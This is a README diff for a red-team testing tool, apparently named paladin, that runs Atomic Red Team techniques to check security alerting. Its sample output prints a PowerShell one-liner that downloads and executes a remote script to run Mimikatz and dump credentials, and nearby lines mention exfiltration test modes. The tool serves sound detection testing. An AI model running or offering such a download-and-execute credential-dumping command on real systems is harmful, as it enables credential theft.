@@ -39,7 +39,33 @@ Server
 $ paladin exfil ping receive -i ens3
 ```
 ### Atomic Red Team
+The atomic red team repo is pulled then stored into a statik fs within the binary. Some tests are not working since this is still WIP.
 
+```
+Run Atomic red team attacks to test security alerting
+tests can be found here https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md
+
+Usage:
+  paladin art [flags]
+
+Flags:
+  -a, --atomic string   Atomic technique to run..ie T1003
+  -h, --help            help for art
+```
+#### Basic Usage
+```console
+$ bin/paladin art -a T1003
+INFO[0000] Running atomic attack T1003
+INFO[0000] Opening /T1003/T1003.yaml
+INFO[0000] Would You Like to Run This Attack?
+Powershell Mimikatz
+IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+
+Use the arrow keys to navigate: ↓ ↑ → ←
+? Select[Yes/No]:
+  ▸ Yes
+    No
+```
 
 ### DNS Exfil
 WIP
